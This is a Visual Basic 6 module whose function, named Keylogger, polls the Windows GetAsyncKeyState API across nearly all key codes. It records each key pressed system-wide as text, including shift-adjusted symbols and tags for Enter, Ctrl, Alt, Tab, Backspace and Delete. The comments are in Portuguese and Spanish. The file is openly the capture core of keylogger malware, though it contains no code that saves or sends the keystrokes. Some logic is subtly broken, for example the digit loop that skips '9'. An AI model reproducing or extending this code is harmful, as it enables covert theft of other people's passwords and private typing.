Attribute VB_Name = "Module1"
Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Numbers As Integer
Public Rs As Long
Public bShift As Boolean
Public Press As String
Public Const sk As Integer = 16

Public Function Keylogger() As Boolean

Numbers = 65

Do Until Numbers = 91 ' checa as letras
    Rs = GetAsyncKeyState(Numbers)
    If Rs = -32767 Then
        Rs = GetKeyState(sk)
        If Rs < 0 Then
            Press = Chr(Numbers)
        Else
            Press = LCase(Chr(Numbers))
        End If
        GoTo KeyFound
    End If
    Numbers = Numbers + 1
Loop

Numbers = 48

Do Until Numbers = 57 ' checa os numeros
    Rs = GetAsyncKeyState(Numbers)
    If Rs = -32767 Then
        Rs = GetKeyState(sk)
        If Rs < 0 Then
            If Numbers = 48 Then Press = ")"
            If Numbers = 49 Then Press = "!"
            If Numbers = 50 Then Press = "@"
            If Numbers = 51 Then Press = "#"
            If Numbers = 52 Then Press = "$"
            If Numbers = 53 Then Press = "%"
            If Numbers = 54 Then Press = "^"
            If Numbers = 55 Then Press = "&"
            If Numbers = 56 Then Press = "*"
            If Numbers = 58 Then Press = "("
                        
            
        Else
            Press = Chr(Numbers)
        End If
        GoTo KeyFound
    End If
    Numbers = Numbers + 1
Loop

Numbers = 96

Do Until Numbers = 112 ' checa as letras
    Rs = GetAsyncKeyState(Numbers)
    If Rs = -32767 Then
        Rs = GetKeyState(sk)
        If Rs < 0 Then
            Press = Chr(Numbers)
        Else
           If Numbers = vbKeyNumpad0 Then Press = "0"
           If Numbers = vbKeyNumpad1 Then Press = "1"
           If Numbers = vbKeyNumpad2 Then Press = "2"
           If Numbers = vbKeyNumpad3 Then Press = "3"
           If Numbers = vbKeyNumpad4 Then Press = "4"
           If Numbers = vbKeyNumpad5 Then Press = "5"
           If Numbers = vbKeyNumpad6 Then Press = "6"
           If Numbers = vbKeyNumpad7 Then Press = "7"
           If Numbers = vbKeyNumpad8 Then Press = "8"
           If Numbers = vbKeyNumpad9 Then Press = "9"
           If Numbers = vbKeyMultiply Then Press = "*"
           If Numbers = vbKeyAdd Then Press = "+"
'           If Numbers = vbKeySeparator Then Press = ","
           If Numbers = vbKeySubtract Then Press = "-"
           If Numbers = vbKeyDecimal Then Press = ","
           If Numbers = vbKeyDivide Then Press = "/"
           
           
'            Press = LCase(Chr(Numbers))
        End If
        GoTo KeyFound
    End If
    Numbers = Numbers + 1
Loop


'si rs = -32767 o valor de rs é TRUE
Rs = GetAsyncKeyState(13) ' checa o enter
If Rs = -32767 Then
    Press = vbCrLf
    GoTo KeyFound
End If

Rs = GetAsyncKeyState(32) ' checa o espaço
If Rs = -32767 Then
    Press = " "
    GoTo KeyFound
End If

Rs = GetAsyncKeyState(160) ' checa o SHIFT
If Rs = -32767 Then
    Press = "[SHIFT]"
    GoTo KeyFound
End If

Rs = GetAsyncKeyState(162) ' checa o CTRL
If Rs = -32767 Then
    Press = "[CTRL]"
    GoTo KeyFound
End If

Rs = GetAsyncKeyState(164) ' checa o CTRL
If Rs = -32767 Then
    Press = "[ALT]"
    GoTo KeyFound
End If

Rs = GetAsyncKeyState(9) ' checa o CTRL
If Rs = -32767 Then
    Press = "[TAB]"
    GoTo KeyFound
End If

Rs = GetAsyncKeyState(8) ' checa o Backspace
If Rs = -32767 Then
    Press = "[BKSP]"
    GoTo KeyFound
End If

Rs = GetAsyncKeyState(46) ' checa a tecla Del
If Rs = -32767 Then
Press = "[DEL]"
GoTo KeyFound
End If

Rs = GetAsyncKeyState(190) ' check For period
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, ">", ".")
GoTo KeyFound
End If

Rs = GetAsyncKeyState(188) ' check For comma
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, "<", ",")
GoTo KeyFound
End If

Rs = GetAsyncKeyState(186) ' check For colon
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, ":", ";")
GoTo KeyFound
End If

Rs = GetAsyncKeyState(191) ' check For question mark
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, "?", "/")
GoTo KeyFound
End If

Rs = GetAsyncKeyState(222) ' check For quotes
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, """", "'")
GoTo KeyFound
End If

Rs = GetAsyncKeyState(192)
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, "~", "`")
GoTo KeyFound
End If

Rs = GetAsyncKeyState(189)
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, "_", "-")
GoTo KeyFound
End If

Rs = GetAsyncKeyState(187)
If Rs = -32767 Then
Rs = GetKeyState(sk)
Press = IIf(Rs < 0, "+", "=")
GoTo KeyFound
End If

For i = 1 To 255   '# El bucle recorrerá desde el valor 8 hasta el 222
  Rs = GetAsyncKeyState(i)  '# Obtendrá la tecla que se situa en el entero i

 If Rs = -32767 Then  '# Verificamos si se ha pulsado alguna tecla

        Press = "[" & i & "]"
        
        GoTo KeyFound
    End If
Next

Keylogger = False ' Key not found, ou seja,
' nao foi pressionada nenhuma tecla
Exit Function

KeyFound:
Keylogger = True

End Function


